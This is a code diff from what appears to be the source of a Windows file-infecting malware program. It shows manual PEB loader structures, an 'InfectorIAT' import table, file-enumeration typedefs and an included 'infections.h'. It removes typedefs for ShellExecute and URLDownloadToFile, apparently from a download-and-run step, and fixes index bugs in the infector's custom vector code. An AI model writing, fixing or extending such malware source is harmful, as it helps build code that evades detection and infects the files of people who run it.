@@ -5,6 +5,7 @@
 #include <windows.h>
 #include <winternl.h>
 #include <shlobj.h>
+#include "infections.h"
 
 typedef struct FULL_PEB_LDR_DATA
 {
@@ -70,8 +71,6 @@ typedef BOOL (* CloseHandleHeader)(HANDLE);
 typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
 typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
 typedef HRESULT (__stdcall *SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);
-typedef HINSTANCE (*ShellExecuteAHeader)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
-typedef HRESULT (__stdcall *URLDownloadToFileHeader)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
 
 struct InfectorIAT
 {
@@ -154,7 +153,7 @@ void cvector_insert(InfectorIAT *iat, CVector *vector, std::size_t index, void *
    if (vector == nullptr || element == nullptr)
       return;
 
-   if (index >= vector->elements && vector->elements != 0)
+   if (index > vector->elements && vector->elements != 0)
       return;
 
    if (vector->data == nullptr)
@@ -166,7 +165,7 @@ void cvector_insert(InfectorIAT *iat, CVector *vector, std::size_t index, void *
 
    cvector_realloc(iat, vector, vector->elements+1);
 
-   if (index+1 != vector->elements)
+   if (index != vector->elements)
    {
       /* we do it this way to prevent doing another malloc/free just to insert */
       for (std::size_t i=1; i<vector->elements-index; ++i)
@@ -200,7 +199,7 @@ void cvector_push(InfectorIAT *iat, CVector *vector, void *element)
    if (vector == nullptr || element == nullptr)
       return;
 
-   cvector_insert(iat, vector, vector->elements-1, element);
+   cvector_insert(iat, vector, vector->elements, element);
 }
 
 void cvector_dequeue(InfectorIAT *iat, CVector *vector, void *element)
